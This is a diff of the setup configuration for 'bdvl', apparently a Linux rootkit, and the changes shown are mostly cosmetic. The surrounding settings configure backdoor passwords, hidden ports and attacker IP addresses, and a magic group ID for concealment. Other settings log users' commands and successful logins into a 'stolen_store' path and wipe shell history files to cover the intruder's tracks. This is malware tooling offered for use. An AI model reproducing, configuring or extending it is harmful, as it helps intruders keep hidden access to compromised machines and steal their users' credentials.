@@ -6,10 +6,7 @@
 # (if it's a list you can also remove everything from the list)
 
 
-# ROOTKIT SETTINGS
-
 # BACKDOOR SETTINGS
-
 
 BACKDOOR_PASS = None  # password for all doors. set to None = random
 
@@ -36,6 +33,7 @@ MAGIC_ACK = 0xc500
 NUM_HIDDEN_PORTS = 2     # no. of random port numbers to be hidden by default. they are displayed during setup & installation.
 CUSTOM_PORTS     = []    # specify ports here if you'd rather choose.
 HIDDEN_IP_ADDRS  = []    # ipv4 addresses in this list will be hidden. (hide all connections from a specific source) keeping empty disables in the kit.
+
 # END OF BACKDOOR SETTINGS
 
 
@@ -65,6 +63,7 @@ GID_CHANGE_MINTIME = 60 * 20
 HIDE_MY_ASS      = True     # keep track of hidden things created by yourself that don't belong to the rootkit. works recursively. initially was for rehiding upon a GID change.
 UNINSTALL_MY_ASS = True     # when running `./bdv uninstall`, bdvl will remove all of the hidden paths kept track of by HIDE_MY_ASS. also works recursively.
 CLEANSE_HOMEDIR  = True     # remove .bashrc, .profile & symlinks when not logged into the box. (when no rootkit processes or hidden ports are alive)
+
 
 LOG_USER_EXEC  = True          # log stuff executed by users. from the moment of installation. straight from the exec hooks.
 LOG_LOCAL_AUTH = True          # log successful auths for users on the box.
@@ -129,10 +128,8 @@ MAX_BLOCK_SIZE = 1024 * 32  # if the block size of a target exceeds this value, 
 
 
 
-# END OF ROOTKIT SETTINGS
 
-
-# SETUP.PY SETTINGS
+# SETUP SETTINGS
 PRINT_ALL_SETTINGS = False
 
 # 'REWRITE_' thingies are permanent. disable them after stuff has been rewritten!
@@ -422,8 +419,7 @@ else:
     else: BDVLPORTS = CUSTOM_PORTS
 if USE_ACCEPT_BD == True: BDVLPORTS.insert(0, ACCEPT_PORT)
 
-MAX_GID, MIN_GID = m.magicmax(), m.magicmin()
-MAGIC_GID = m.maGicalID()
+MAX_GID, MIN_GID, MAGIC_GID = m.magicmax(), m.magicmin(), m.maGicalID()
 INSTALL_DIR = ut.randpath(14)
 BDVLSO = ut.sogetname(INSTALL_DIR)
 CLEANEDTIME_PATH = ut.randpath(12) if not FILE_CLEANSE_TIMER == None else None
@@ -457,10 +453,10 @@ SETTINGS = { # all of these are written to bdv.h. if a value is None it is skipp
 # the following paths are linked to within the installation directory.
 # & removed when we aren't logged into the box.
 LINKPATHS = {
-    SETTINGS['SSH_LOGS']:'ssh_logs',         SETTINGS['HIDEPORTS']:'hide_ports',
-    SETTINGS['INTEREST_DIR']:'interest_dir', SETTINGS['LOG_PATH']:'auth_logs',
-    SETTINGS['ASS_PATH']:'my_ass',           SETTINGS['INSTALL_DIR']:'install_dir',
-    SETTINGS['EXEC_LOGS']:'exec_logs',       SETTINGS['HIDEADDRS']:'hide_addrs',
+    SETTINGS['SSH_LOGS']:'ssh_logs',           SETTINGS['HIDEPORTS']:'hide_ports',
+    SETTINGS['INTEREST_DIR']:'interest_dir',   SETTINGS['LOG_PATH']:'auth_logs',
+    SETTINGS['ASS_PATH']:'my_ass',             SETTINGS['INSTALL_DIR']:'install_dir',
+    SETTINGS['EXEC_LOGS']:'exec_logs',         SETTINGS['HIDEADDRS']:'hide_addrs',
     SETTINGS['STOLESTORE_PATH']:'stolen_store'
 }
 
